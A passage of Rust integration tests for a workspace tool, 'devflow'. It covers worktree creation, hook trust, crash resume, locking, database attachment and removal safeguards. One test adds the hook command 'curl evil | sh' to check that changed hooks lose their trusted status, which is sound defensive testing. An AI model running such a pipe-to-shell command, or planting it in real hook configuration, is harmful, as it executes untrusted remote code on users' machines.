//! Workspace lifecycle against real Git repositories in temporary directories.
//! Tests that need Docker or pitchfork are `#[ignore]`d.
use devflow_core::config::Config;
use devflow_core::db::DataSource;
use devflow_core::error::{Busy, Protected};
use devflow_core::receipt::{DataBinding, Phase, PhaseState, Receipt, Status};
use devflow_core::setup::{
    self, CreateRequest, NoProgress, Progress, RemoveOptions, SetupOptions, SetupOutcome,
};
use devflow_core::worktree::{self, Workspace};
use devflow_core::{Project, cow, env_file, trust};
use std::path::{Path, PathBuf};
use std::sync::{Once, OnceLock};

/// Process-wide state directories. Every test uses its own random project id,
/// so sharing one trust file does not couple tests.
fn init() -> &'static Path {
    static ONCE: Once = Once::new();
    static DIR: OnceLock<tempfile::TempDir> = OnceLock::new();
    ONCE.call_once(|| {
        let dir = DIR.get_or_init(|| tempfile::tempdir().unwrap());
        // SAFETY: runs once, before any test body touches the environment.
        unsafe {
            std::env::set_var("DEVFLOW_CONFIG_DIR", dir.path().join("config"));
            std::env::set_var("DEVFLOW_DATA_DIR", dir.path().join("data"));
            std::env::set_var("PITCHFORK_STATE_DIR", dir.path().join("pf-state"));
            std::env::set_var("PITCHFORK_CONFIG_DIR", dir.path().join("pf-config"));
            std::env::set_var("PITCHFORK_LOGS_DIR", dir.path().join("pf-logs"));
            // A child test process (see `in_child`) is started with these set.
            if std::env::var_os(CHILD).is_none() {
                std::env::remove_var("DEVFLOW_TRUST_HOOKS");
                std::env::remove_var("DEVFLOW_INSTANCE_ID");
            }
        }
    });
    DIR.get().unwrap().path()
}

const CHILD: &str = "DEVFLOW_TEST_CHILD";

/// Environment variables are process-wide, so a test about one runs alone in a
/// child process started with it set instead of changing the environment of
/// the tests running beside it. Returns `true` inside the child (run the test
/// body); in the parent it runs the child and asserts that it passed.
fn in_child(test: &str, env: &[(&str, &str)]) -> bool {
    if std::env::var_os(CHILD).is_some() {
        return true;
    }
    let output = std::process::Command::new(std::env::current_exe().unwrap())
        .args([test, "--exact", "--nocapture", "--test-threads=1"])
        .envs(env.iter().copied())
        .env(CHILD, "1")
        .output()
        .unwrap();
    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        output.status.success() && stdout.contains("1 passed"),
        "child run of {test} failed:\n{stdout}\n{stderr}"
    );
    false
}

fn protection(error: &anyhow::Error) -> &Protected {
    error
        .downcast_ref::<Protected>()
        .unwrap_or_else(|| panic!("not a typed refusal: {error:#}"))
}

/// Records progress callbacks.
#[derive(Default)]
struct Recorder {
    phases: Vec<(Phase, PhaseState)>,
    lines: Vec<String>,
}

impl Progress for Recorder {
    fn phase(&mut self, phase: Phase, state: PhaseState, _: Option<&str>) {
        self.phases.push((phase, state));
    }
    fn output(&mut self, line: &str) {
        self.lines.push(line.to_string());
    }
}

struct Repo {
    _dir: tempfile::TempDir,
    root: PathBuf,
    project: Project,
}

#[derive(Default)]
struct Hooks<'a> {
    setup: &'a [&'a str],
    switch: &'a [&'a str],
    teardown: &'a [&'a str],
}

fn toml_list(items: &[&str]) -> String {
    let items: Vec<_> = items
        .iter()
        .map(|s| {
            assert!(!s.contains('\''), "test commands avoid single quotes");
            format!("'{s}'")
        })
        .collect();
    format!("[{}]", items.join(", "))
}

fn config_text(hooks: &Hooks, extra: &str) -> String {
    format!(
        "[project]\nname = \"shop\"\nid = \"{}\"\n\n[worktree]\ncopy = [\".env\", \"node_modules\"]\n\n\
         [hooks]\nsetup = {}\nswitch = {}\nteardown = {}\n\n{extra}",
        uuid::Uuid::new_v4(),
        toml_list(hooks.setup),
        toml_list(hooks.switch),
        toml_list(hooks.teardown),
    )
}

fn commit_all(repo: &git2::Repository, message: &str) {
    let mut index = repo.index().unwrap();
    index
        .add_all(["*"], git2::IndexAddOption::DEFAULT, None)
        .unwrap();
    index.write().unwrap();
    let tree = repo.find_tree(index.write_tree().unwrap()).unwrap();
    let parent = repo.head().ok().and_then(|h| h.peel_to_commit().ok());
    let parents: Vec<_> = parent.iter().collect();
    let sig = git2::Signature::now("Test", "test@example.com").unwrap();
    repo.commit(Some("HEAD"), &sig, &sig, message, &tree, &parents)
        .unwrap();
}

/// A repository `shop` on `main` with a committed `devflow.toml`, plus an
/// ignored `.env` and `node_modules` in the main checkout.
fn repo(hooks: &Hooks, extra: &str) -> Repo {
    init();
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path().canonicalize().unwrap().join("shop");
    std::fs::create_dir_all(&root).unwrap();
    let mut options = git2::RepositoryInitOptions::new();
    options.initial_head("main");
    let git = git2::Repository::init_opts(&root, &options).unwrap();
    std::fs::write(root.join("devflow.toml"), config_text(hooks, extra)).unwrap();
    std::fs::write(
        root.join(".gitignore"),
        ".env\nnode_modules/\ndevflow.local.toml\n",
    )
    .unwrap();
    std::fs::write(root.join("README.md"), "shop\n").unwrap();
    commit_all(&git, "initial");
    std::fs::write(root.join(".env"), "SECRET=1\n").unwrap();
    std::fs::create_dir_all(root.join("node_modules/pkg")).unwrap();
    std::fs::write(
        root.join("node_modules/pkg/index.js"),
        "module.exports = 1;\n",
    )
    .unwrap();
    let project = Project::open(&root).unwrap();
    Repo {
        _dir: dir,
        root,
        project,
    }
}

fn plain() -> Repo {
    repo(&Hooks::default(), "")
}

fn create(project: &Project, name: &str, options: SetupOptions) -> anyhow::Result<SetupOutcome> {
    setup::create(
        project,
        CreateRequest {
            name: name.into(),
            from: None,
            options,
        },
        &mut NoProgress,
    )
}

fn trusted() -> SetupOptions {
    SetupOptions {
        trust_hooks: true,
        ..Default::default()
    }
}

fn receipt_of(ws: &Workspace) -> Receipt {
    Receipt::load(&ws.git_dir).unwrap().expect("receipt")
}

fn ws(project: &Project, name: &str) -> Workspace {
    worktree::find(project, name)
        .unwrap()
        .unwrap_or_else(|| panic!("no workspace {name}"))
}

fn env_map(ws: &Workspace) -> std::collections::HashMap<String, String> {
    env_file::read(&ws.path).unwrap().into_iter().collect()
}

#[test]
fn create_clones_payload_writes_env_and_runs_trusted_hooks() {
    let t = repo(
        &Hooks {
            setup: &[
                "echo \"$DEVFLOW_WORKSPACE|$DEVFLOW_PHASE|$DEVFLOW_SETUP_ACTIVE|$DEVFLOW_WORKSPACE_ID|$DEVFLOW_SOURCE_PATH|$DEVFLOW_PROJECT_ROOT\" > .devflow/marker",
                "echo second >> .devflow/marker",
            ],
            ..Default::default()
        },
        "",
    );
    trust::approve(&t.project).unwrap();
    let mut rec = Recorder::default();
    let out = setup::create(
        &t.project,
        CreateRequest {
            name: "feature/a".into(),
            from: None,
            options: SetupOptions::default(),
        },
        &mut rec,
    )
    .unwrap();

    assert_eq!(out.status, Status::Ready, "{:?}", out.receipt.phases);
    let w = &out.workspace;
    assert_eq!(w.name, "feature/a");
    assert!(w.path.ends_with("shop.worktrees/feature-a"));
    assert!(
        !worktree::is_dirty(w).unwrap(),
        "payload and .devflow are ignored"
    );

    // Payload: both entries cloned from the main checkout.
    assert_eq!(out.payload.len(), 2);
    assert!(
        out.payload
            .iter()
            .all(|e| matches!(e.result, cow::EntryResult::Done { .. }))
    );
    assert_eq!(
        std::fs::read_to_string(w.path.join(".env")).unwrap(),
        "SECRET=1\n"
    );
    assert_eq!(
        std::fs::read_to_string(w.path.join("node_modules/pkg/index.js")).unwrap(),
        "module.exports = 1;\n"
    );

    // Env file: private, with the DEVFLOW_* identity and no database entries.
    let env = env_map(w);
    assert_eq!(env["DEVFLOW_PROJECT"], "shop");
    assert_eq!(env["DEVFLOW_WORKSPACE"], "feature/a");
    assert_eq!(env["DEVFLOW_WORKSPACE_PATH"], w.path.display().to_string());
    assert_eq!(env["DEVFLOW_PROJECT_ROOT"], t.root.display().to_string());
    assert_eq!(env["DEVFLOW_SOURCE_PATH"], t.root.display().to_string());
    assert_eq!(
        env["DEVFLOW_WORKSPACE_ID"],
        out.receipt.instance_id.to_string()
    );
    assert!(
        !env.contains_key("DEVFLOW_INSTANCE_ID"),
        "the override's name is never exported: sourcing the file must not set it"
    );
    assert!(!env.contains_key("DATABASE_URL"));
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mode = env_file::path(&w.path)
            .metadata()
            .unwrap()
            .permissions()
            .mode();
        assert_eq!(mode & 0o777, 0o600);
        let mode = Receipt::path(&w.git_dir)
            .metadata()
            .unwrap()
            .permissions()
            .mode();
        assert_eq!(mode & 0o777, 0o600);
    }

    // Hooks ran in order, in the worktree, with the environment.
    let marker = std::fs::read_to_string(w.path.join(".devflow/marker")).unwrap();
    let mut lines = marker.lines();
    assert_eq!(
        lines.next().unwrap(),
        format!(
            "feature/a|setup|1|{}|{}|{}",
            out.receipt.instance_id,
            t.root.display(),
            t.root.display()
        )
    );
    assert_eq!(lines.next(), Some("second"));
    let report = out.hooks.as_ref().unwrap();
    assert!(report.ok && report.runs.len() == 2);
    let log = report.log.as_ref().unwrap();
    assert!(log.starts_with(Receipt::logs_dir(&w.git_dir)));
    assert!(
        std::fs::read_to_string(log)
            .unwrap()
            .contains("$ echo second")
    );
    assert!(rec.lines.iter().any(|l| l.starts_with("$ echo second")));

    // Receipt: identical on disk, every phase recorded, digest pinned.
    assert_eq!(receipt_of(w), out.receipt);
    assert_eq!(out.receipt.code_source.as_deref(), Some("main"));
    assert_eq!(out.receipt.project_id, t.project.id());
    assert_eq!(
        out.receipt.hooks_digest,
        Some(trust::digest(&t.project.config.hooks))
    );
    assert_eq!(
        out.receipt.phase(Phase::Database).state,
        PhaseState::Skipped
    );
    assert!(!out.receipt.phase(Phase::Database).required_skip);
    assert_eq!(
        rec.phases,
        vec![
            (Phase::Materialize, PhaseState::Started),
            (Phase::Materialize, PhaseState::Done),
            (Phase::Payload, PhaseState::Started),
            (Phase::Payload, PhaseState::Done),
            (Phase::Database, PhaseState::Started),
            (Phase::Database, PhaseState::Skipped),
            (Phase::Env, PhaseState::Started),
            (Phase::Env, PhaseState::Done),
            (Phase::Hooks, PhaseState::Started),
            (Phase::Hooks, PhaseState::Done),
        ]
    );

    // Listing: default is not set up, the new workspace is ready and idle.
    let list = setup::list(&t.project).unwrap();
    assert_eq!(list.len(), 2);
    assert!(list[0].workspace.is_default && list[0].status.is_none());
    assert_eq!(list[1].status, Some(Status::Ready));
    assert!(!list[1].busy);

    // Creating it again is an error; the existing workspace is untouched.
    let error = create(&t.project, "feature/a", SetupOptions::default()).unwrap_err();
    assert!(error.to_string().contains("already exists"), "{error:#}");
    assert!(create(&t.project, "main", SetupOptions::default()).is_err());
}

#[test]
fn create_from_another_workspace_copies_its_payload() {
    let t = repo(&Hooks::default(), "");
    let a = create(&t.project, "a", SetupOptions::default())
        .unwrap()
        .workspace;
    std::fs::write(a.path.join(".env"), "SECRET=changed-in-a\n").unwrap();
    let out = setup::create(
        &t.project,
        CreateRequest {
            name: "b".into(),
            from: Some("a".into()),
            options: SetupOptions::default(),
        },
        &mut NoProgress,
    )
    .unwrap();
    assert_eq!(out.receipt.code_source.as_deref(), Some("a"));
    assert_eq!(
        std::fs::read_to_string(out.workspace.path.join(".env")).unwrap(),
        "SECRET=changed-in-a\n"
    );
    assert_eq!(
        env_map(&out.workspace)["DEVFLOW_SOURCE_PATH"],
        a.path.display().to_string()
    );
    assert!(
        setup::create(
            &t.project,
            CreateRequest {
                name: "c".into(),
                from: Some("nope".into()),
                options: SetupOptions::default()
            },
            &mut NoProgress,
        )
        .is_err()
    );
    assert!(
        worktree::find(&t.project, "c").unwrap().is_none(),
        "nothing created for an unknown source"
    );
}

#[test]
fn untrusted_hooks_need_attention_until_approved_then_setup_resumes() {
    let t = repo(
        &Hooks {
            setup: &["echo ran > .devflow/marker"],
            ..Default::default()
        },
        "",
    );
    let out = create(&t.project, "feature", SetupOptions::default()).unwrap();
    assert_eq!(out.status, Status::NeedsAttention);
    let w = out.workspace.clone();
    let hooks = out.receipt.phase(Phase::Hooks);
    assert_eq!(hooks.state, PhaseState::Skipped);
    assert!(hooks.required_skip);
    assert!(hooks.detail.unwrap().contains("devflow trust"));
    assert!(out.hooks.is_none());
    assert!(!w.path.join(".devflow/marker").exists());
    // Everything before the hooks is in place.
    assert!(w.path.join(".env").is_file());
    assert!(env_file::path(&w.path).is_file());
    assert_eq!(
        setup::list(&t.project).unwrap()[1].status,
        Some(Status::NeedsAttention)
    );

    // `create` on the same name resumes instead of failing; still untrusted.
    let again = create(&t.project, "feature", SetupOptions::default()).unwrap();
    assert_eq!(again.status, Status::NeedsAttention);
    assert!(again.payload.is_empty(), "payload is not repeated");

    // `--if-new` resumes an incomplete receipt as well.
    assert!(
        setup::setup(
            &t.project,
            &w,
            SetupOptions::default(),
            true,
            false,
            &mut NoProgress
        )
        .unwrap()
        .is_some()
    );

    trust::approve(&t.project).unwrap();
    let mut rec = Recorder::default();
    let out = setup::setup(
        &t.project,
        &w,
        SetupOptions::default(),
        false,
        false,
        &mut rec,
    )
    .unwrap()
    .unwrap();
    assert_eq!(out.status, Status::Ready);
    assert!(out.payload.is_empty());
    assert_eq!(
        rec.phases,
        vec![
            (Phase::Hooks, PhaseState::Started),
            (Phase::Hooks, PhaseState::Done)
        ]
    );
    assert_eq!(
        std::fs::read_to_string(w.path.join(".devflow/marker")).unwrap(),
        "ran\n"
    );

    // Now it is complete: `--if-new` does nothing, and so does a plain re-run.
    assert!(
        setup::setup(
            &t.project,
            &w,
            SetupOptions::default(),
            true,
            false,
            &mut NoProgress
        )
        .unwrap()
        .is_none()
    );
    let rerun = setup::setup(
        &t.project,
        &w,
        SetupOptions::default(),
        false,
        false,
        &mut rec,
    )
    .unwrap()
    .unwrap();
    assert_eq!(rerun.status, Status::Ready);
    assert_eq!(rec.phases.len(), 2, "no phase ran again");
    assert!(create(&t.project, "feature", SetupOptions::default()).is_err());
}

#[test]
fn changing_the_hooks_revokes_trust() {
    let t = repo(
        &Hooks {
            setup: &["true"],
            ..Default::default()
        },
        "",
    );
    trust::approve(&t.project).unwrap();
    assert_eq!(
        trust::state(&t.project).unwrap(),
        trust::TrustState::Trusted
    );
    let mut changed = t.project.clone();
    changed.config.hooks.setup.push("curl evil | sh".into());
    let out = create(&changed, "feature", SetupOptions::default()).unwrap();
    assert_eq!(out.status, Status::NeedsAttention);
    match trust::state(&changed).unwrap() {
        trust::TrustState::Untrusted {
            previously_trusted, ..
        } => assert!(previously_trusted),
        other => panic!("{other:?}"),
    }
}

#[test]
fn trust_option_runs_untrusted_hooks_for_one_run_only() {
    let t = repo(
        &Hooks {
            setup: &["echo ok > .devflow/marker"],
            ..Default::default()
        },
        "",
    );
    let out = create(&t.project, "ci", trusted()).unwrap();
    assert_eq!(out.status, Status::Ready);
    assert!(out.workspace.path.join(".devflow/marker").is_file());
    assert!(matches!(
        trust::state(&t.project).unwrap(),
        trust::TrustState::Untrusted { .. }
    ));
}

#[test]
fn no_hooks_flag_skips_without_needing_attention() {
    let t = repo(
        &Hooks {
            setup: &["touch .devflow/never"],
            ..Default::default()
        },
        "",
    );
    let out = create(
        &t.project,
        "quick",
        SetupOptions {
            no_hooks: true,
            ..Default::default()
        },
    )
    .unwrap();
    assert_eq!(out.status, Status::Ready);
    assert!(!out.workspace.path.join(".devflow/never").exists());
}

#[test]
fn a_failing_hook_is_reported_in_the_outcome_and_retried_on_resume() {
    let t = repo(
        &Hooks {
            setup: &["echo before", "echo boom; exit 7", "touch .devflow/after"],
            ..Default::default()
        },
        "",
    );
    let out = create(&t.project, "broken", trusted()).unwrap();
    assert_eq!(out.status, Status::NeedsAttention);
    let report = out.hooks.as_ref().unwrap();
    assert!(!report.ok);
    assert_eq!(report.runs.len(), 2);
    assert_eq!(report.runs[1].exit_code, Some(7));
    assert!(!out.workspace.path.join(".devflow/after").exists());
    let phase = out.receipt.phase(Phase::Hooks);
    assert_eq!(phase.state, PhaseState::Failed);
    assert!(phase.detail.unwrap().contains("exit 7"));
    assert!(
        std::fs::read_to_string(report.log.as_ref().unwrap())
            .unwrap()
            .contains("boom")
    );

    // Fix the hooks and resume.
    let mut fixed = t.project.clone();
    fixed.config.hooks.setup = vec!["touch .devflow/fixed".into()];
    let out = setup::setup(
        &fixed,
        &out.workspace,
        trusted(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_eq!(out.status, Status::Ready);
    assert!(out.workspace.path.join(".devflow/fixed").is_file());
}

#[test]
fn hook_timeout_marks_the_workspace_needing_attention() {
    let t = repo(
        &Hooks {
            setup: &["sleep 60"],
            ..Default::default()
        },
        "",
    );
    let mut project = t.project.clone();
    project.config.hooks.timeout = "300ms".into();
    let started = std::time::Instant::now();
    let out = create(&project, "slow", trusted()).unwrap();
    assert!(started.elapsed() < std::time::Duration::from_secs(10));
    assert_eq!(out.status, Status::NeedsAttention);
    assert!(out.hooks.unwrap().runs[0].timed_out);
    assert!(
        out.receipt
            .phase(Phase::Hooks)
            .detail
            .unwrap()
            .contains("timed out")
    );
}

#[test]
fn resume_after_a_simulated_crash_completes_the_remaining_phases() {
    let t = repo(
        &Hooks {
            setup: &["echo done > .devflow/marker"],
            ..Default::default()
        },
        "",
    );
    trust::approve(&t.project).unwrap();
    // The process died right after recording `payload: started`.
    let w = worktree::create(&t.project, "crashed", None).unwrap();
    let mut receipt = Receipt::new(t.project.id(), "crashed", Some("main".into()));
    receipt.set_phase(Phase::Materialize, PhaseState::Done, None);
    receipt.set_phase(Phase::Payload, PhaseState::Started, None);
    receipt.save(&w.git_dir).unwrap();
    assert!(!w.path.join(".env").exists());
    assert_eq!(
        setup::list(&t.project).unwrap()[1].status,
        Some(Status::InProgress)
    );

    let out = setup::setup(
        &t.project,
        &w,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_eq!(out.status, Status::Ready);
    assert_eq!(
        out.receipt.instance_id, receipt.instance_id,
        "identity survives a resume"
    );
    assert!(w.path.join(".env").is_file());
    assert!(w.path.join("node_modules/pkg/index.js").is_file());
    assert!(w.path.join(".devflow/marker").is_file());

    // A crash in the middle of the hooks phase re-runs the hooks (at least once).
    let mut receipt = receipt_of(&w);
    receipt.set_phase(Phase::Hooks, PhaseState::Started, None);
    receipt.save(&w.git_dir).unwrap();
    std::fs::remove_file(w.path.join(".devflow/marker")).unwrap();
    let out = setup::setup(
        &t.project,
        &w,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_eq!(out.status, Status::Ready);
    assert!(w.path.join(".devflow/marker").is_file());
}

#[test]
fn a_running_setup_blocks_a_second_one() {
    let t = plain();
    let w = worktree::create(&t.project, "busy", None).unwrap();
    let held = Receipt::try_lock(&w.git_dir).unwrap().unwrap();
    // A receipt must exist for the list to report the workspace.
    let mut receipt = Receipt::new(t.project.id(), "busy", None);
    receipt.set_phase(Phase::Materialize, PhaseState::Done, None);
    receipt.save(&w.git_dir).unwrap();

    let error = setup::setup(
        &t.project,
        &w,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap_err();
    let busy = error.downcast_ref::<Busy>().expect("typed busy error");
    assert_eq!(busy.workspace, "busy");
    // `--if-new` with nothing ready must not look like success: the workspace
    // is not set up yet, only someone else is setting it up.
    let error = setup::setup(
        &t.project,
        &w,
        SetupOptions::default(),
        true,
        false,
        &mut NoProgress,
    )
    .unwrap_err();
    assert_eq!(
        error
            .downcast_ref::<Busy>()
            .expect("typed busy error, not a silent skip")
            .workspace,
        "busy"
    );
    let listed = setup::list(&t.project).unwrap();
    assert!(listed[1].busy);
    assert_eq!(listed[1].status, Some(Status::InProgress));
    // Removal also waits for the running setup.
    let error = setup::remove(
        &t.project,
        "busy",
        RemoveOptions {
            force: true,
            ..Default::default()
        },
        &mut NoProgress,
    )
    .unwrap_err();
    assert_eq!(error.downcast_ref::<Busy>().unwrap().workspace, "busy");
    assert!(w.path.exists());
    // Reset and creating over the running workspace report the same thing.
    let error = setup::reset_data(&t.project, &w, None).unwrap_err();
    assert!(error.downcast_ref::<Busy>().is_some(), "{error:#}");
    let error = create(&t.project, "busy", SetupOptions::default()).unwrap_err();
    assert!(error.downcast_ref::<Busy>().is_some(), "{error:#}");

    drop(held);
    assert!(
        setup::setup(
            &t.project,
            &w,
            SetupOptions::default(),
            false,
            false,
            &mut NoProgress
        )
        .is_ok()
    );
}

#[test]
fn if_new_skips_a_ready_workspace_even_while_it_is_locked_but_not_an_unready_one() {
    let t = plain();
    // A ready receipt written directly: a finished `create` can leave its lock
    // file descriptor open in a process another test thread has just spawned,
    // and this test must be able to take the lock at once.
    let w = worktree::create(&t.project, "ready", None).unwrap();
    let mut done = Receipt::new(t.project.id(), "ready", None);
    for phase in Phase::ALL {
        done.set_phase(phase, PhaseState::Done, None);
    }
    done.save(&w.git_dir).unwrap();
    assert_eq!(done.status(), Status::Ready);
    let held = Receipt::try_lock(&w.git_dir).unwrap().unwrap();
    let if_new = |w: &Workspace| {
        setup::setup(
            &t.project,
            w,
            SetupOptions::default(),
            true,
            false,
            &mut NoProgress,
        )
    };
    assert!(
        if_new(&w).unwrap().is_none(),
        "ready: nothing to do, whoever holds the lock"
    );

    // No receipt at all (a worktree another tool made): busy, not skipped.
    let raw = worktree::create(&t.project, "raw", None).unwrap();
    let held_raw = Receipt::try_lock(&raw.git_dir).unwrap().unwrap();
    let error = if_new(&raw).unwrap_err();
    assert!(error.downcast_ref::<Busy>().is_some(), "{error:#}");
    assert!(
        Receipt::load(&raw.git_dir).unwrap().is_none(),
        "nothing written"
    );
    drop((held, held_raw));
    assert!(if_new(&raw).unwrap().is_some(), "free again: it is adopted");
}

#[test]
fn if_new_adopts_worktrees_made_by_other_tools_and_then_does_nothing() {
    let t = repo(
        &Hooks {
            setup: &["echo adopted > .devflow/marker"],
            ..Default::default()
        },
        "",
    );
    trust::approve(&t.project).unwrap();
    // `git worktree add` equivalent: a worktree without any devflow state.
    let w = worktree::create(&t.project, "by-agent", None).unwrap();
    assert!(Receipt::load(&w.git_dir).unwrap().is_none());
    let out = setup::setup(
        &t.project,
        &w,
        SetupOptions::default(),
        true,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .expect("adopted");
    assert_eq!(out.status, Status::Ready);
    assert_eq!(
        out.receipt.code_source, None,
        "adopted worktrees use the default workspace"
    );
    assert_eq!(out.receipt.workspace, "by-agent");
    assert!(
        w.path.join(".env").is_file(),
        "payload comes from the default workspace"
    );
    assert_eq!(
        env_map(&w)["DEVFLOW_SOURCE_PATH"],
        t.root.display().to_string()
    );
    assert!(w.path.join(".devflow/marker").is_file());
    assert!(
        setup::setup(
            &t.project,
            &w,
            SetupOptions::default(),
            true,
            false,
            &mut NoProgress
        )
        .unwrap()
        .is_none()
    );
}

#[test]
fn a_receipt_from_another_project_is_refused_not_adopted() {
    let t = plain();
    let w = worktree::create(&t.project, "foreign", None).unwrap();
    let mut receipt = Receipt::new(uuid::Uuid::new_v4(), "foreign", None);
    receipt.set_phase(Phase::Materialize, PhaseState::Done, None);
    receipt.save(&w.git_dir).unwrap();
    let error = setup::setup(
        &t.project,
        &w,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap_err();
    assert!(error.to_string().contains("another project"), "{error:#}");
    assert!(!w.path.join(".env").exists(), "nothing ran");
    // Listing ignores it.
    assert_eq!(setup::list(&t.project).unwrap()[1].status, None);
    // The foreign receipt is left alone when removing: no data or hooks are touched.
    let out = setup::remove(
        &t.project,
        "foreign",
        RemoveOptions::default(),
        &mut NoProgress,
    )
    .unwrap();
    assert!(
        out.warnings.iter().any(|w| w.contains("another project")),
        "{:?}",
        out.warnings
    );
    assert!(!w.path.exists());
}

#[test]
fn new_instance_gives_a_fork_a_fresh_identity_and_forgets_the_copied_binding() {
    let t = repo(
        &Hooks {
            setup: &["echo \"$DEVFLOW_WORKSPACE_ID\" > .devflow/marker"],
            ..Default::default()
        },
        "",
    );
    trust::approve(&t.project).unwrap();
    let out = create(&t.project, "vm", SetupOptions::default()).unwrap();
    let w = out.workspace.clone();
    let old_instance = out.receipt.instance_id;
    // Pretend the original instance had been bound to a database branch.
    let branch = uuid::Uuid::new_v4();
    let mut copied = receipt_of(&w);
    copied.data_source = Some("workspace:main".into());
    copied.data = Some(DataBinding {
        branch_id: Some(branch),
        database: "df_a_b".into(),
        role: "dfl_b".into(),
        url: "postgres://dfl_b:pw@old-host:5432/df_a_b".into(),
        source: "workspace:main".into(),
        owned: true,
    });
    copied.save(&w.git_dir).unwrap();
    std::fs::remove_file(w.path.join(".devflow/marker")).unwrap();

    let mut rec = Recorder::default();
    let out = setup::setup(
        &t.project,
        &w,
        SetupOptions::default(),
        false,
        true,
        &mut rec,
    )
    .unwrap()
    .unwrap();
    assert_eq!(out.status, Status::Ready);
    assert_ne!(out.receipt.instance_id, old_instance);
    assert!(
        out.receipt.data.is_none(),
        "the copied binding lost its authority"
    );
    assert_eq!(
        out.receipt.data_source,
        Some(format!("branch:{branch}")),
        "the new branch would clone the previous one"
    );
    // Database, env and hooks ran again; code phases did not.
    let phases: Vec<_> = rec
        .phases
        .iter()
        .filter(|(_, s)| *s == PhaseState::Started)
        .map(|(p, _)| *p)
        .collect();
    assert_eq!(phases, vec![Phase::Database, Phase::Env, Phase::Hooks]);
    assert!(out.payload.is_empty());
    // Without [postgres] there is nothing to provision: no stale DATABASE_URL.
    assert!(!env_map(&w).contains_key("DATABASE_URL"));
    assert_eq!(
        env_map(&w)["DEVFLOW_WORKSPACE_ID"],
        out.receipt.instance_id.to_string()
    );
    assert_eq!(
        std::fs::read_to_string(w.path.join(".devflow/marker"))
            .unwrap()
            .trim(),
        out.receipt.instance_id.to_string()
    );
    assert_eq!(receipt_of(&w), out.receipt);

    // `--data-from` overrides the recorded choice.
    let out = setup::setup(
        &t.project,
        &w,
        SetupOptions {
            data_from: Some(DataSource::Empty),
            ..Default::default()
        },
        false,
        true,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_eq!(out.receipt.data_source.as_deref(), Some("empty"));
}

#[test]
fn database_url_attaches_without_provisioning_and_is_detach_only() {
    let t = plain();
    let url = "postgres://dfl_x:p%40ss@db.internal:6543/df_proj_x?sslmode=require";
    let out = create(
        &t.project,
        "sandbox",
        SetupOptions {
            database_url: Some(url.into()),
            ..Default::default()
        },
    )
    .unwrap();
    assert_eq!(out.status, Status::Ready);
    let binding = out.receipt.data.clone().unwrap();
    assert_eq!(binding.branch_id, None);
    assert!(!binding.owned);
    assert_eq!(binding.source, "url");
    assert_eq!(binding.url, url);
    assert_eq!(
        (binding.database.as_str(), binding.role.as_str()),
        ("df_proj_x", "dfl_x")
    );

    let env = env_map(&out.workspace);
    assert_eq!(env["DATABASE_URL"], url);
    assert_eq!(env["PGHOST"], "db.internal");
    assert_eq!(env["PGPORT"], "6543");
    assert_eq!(env["PGUSER"], "dfl_x");
    assert_eq!(env["PGPASSWORD"], "p@ss");
    assert_eq!(env["PGDATABASE"], "df_proj_x");

    // Attachments can be neither reset nor snapshotted, and removal never drops anything.
    let w = out.workspace;
    let error = setup::reset_data(&t.project, &w, None).unwrap_err();
    assert!(error.to_string().contains("URL only"), "{error:#}");
    assert!(setup::snapshot(&t.project, &w, "seed").is_err());
    let removed = setup::remove(
        &t.project,
        "sandbox",
        RemoveOptions::default(),
        &mut NoProgress,
    )
    .unwrap();
    assert_eq!(removed.dropped_branch, None);
    assert!(!w.path.exists());

    assert!(
        create(
            &t.project,
            "bad",
            SetupOptions {
                database_url: Some("mysql://x/y".into()),
                ..Default::default()
            }
        )
        .is_err()
    );
}

#[test]
fn no_db_skips_the_database_even_with_a_url() {
    let t = plain();
    let out = create(
        &t.project,
        "nodb",
        SetupOptions {
            no_db: true,
            database_url: Some("postgres://u:p@h/d".into()),
            ..Default::default()
        },
    )
    .unwrap();
    assert!(out.receipt.data.is_none());
    assert_eq!(
        out.receipt.phase(Phase::Database).state,
        PhaseState::Skipped
    );
}

#[test]
fn path_collisions_are_refused_without_side_effects() {
    let t = plain();
    create(&t.project, "feature/a", SetupOptions::default()).unwrap();
    let error = create(&t.project, "feature-a", SetupOptions::default()).unwrap_err();
    assert!(error.to_string().contains("already exists"), "{error:#}");
    assert_eq!(worktree::list(&t.project).unwrap().len(), 2);
    assert!(
        t.project
            .repo()
            .unwrap()
            .find_branch("feature-a", git2::BranchType::Local)
            .is_err()
    );
    // A plain directory in the way is refused too, and left untouched.
    let blocked = worktree::path_for(&t.project, "taken");
    std::fs::create_dir_all(&blocked).unwrap();
    std::fs::write(blocked.join("mine.txt"), "keep").unwrap();
    assert!(create(&t.project, "taken", SetupOptions::default()).is_err());
    assert_eq!(
        std::fs::read_to_string(blocked.join("mine.txt")).unwrap(),
        "keep"
    );
}

#[test]
fn remove_checks_every_protection_before_any_effect() {
    let marker_dir = tempfile::tempdir().unwrap();
    let marker = marker_dir.path().join("teardown-ran");
    let teardown = format!("touch {}", marker.display());
    let t = repo(
        &Hooks {
            teardown: &[&teardown],
            ..Default::default()
        },
        "",
    );
    trust::approve(&t.project).unwrap();
    let w = create(&t.project, "guarded", SetupOptions::default())
        .unwrap()
        .workspace;
    let remove = |name: &str, options: RemoveOptions| {
        setup::remove(&t.project, name, options, &mut NoProgress)
    };
    let still_there = || {
        assert!(w.path.exists(), "workspace must survive a refusal");
        assert!(
            !marker.exists(),
            "teardown must not run before the protections pass"
        );
    };

    // The default workspace, even forced.
    let error = remove(
        "main",
        RemoveOptions {
            force: true,
            ..Default::default()
        },
    )
    .unwrap_err();
    assert!(error.to_string().contains("default workspace"), "{error:#}");
    assert!(!protection(&error).forceable);
    assert_eq!(protection(&error).workspace, "main");
    assert!(t.root.join("README.md").is_file());

    // The caller's directory, even forced and from a subdirectory.
    let sub = w.path.join("src/deep");
    std::fs::create_dir_all(&sub).unwrap();
    for force in [false, true] {
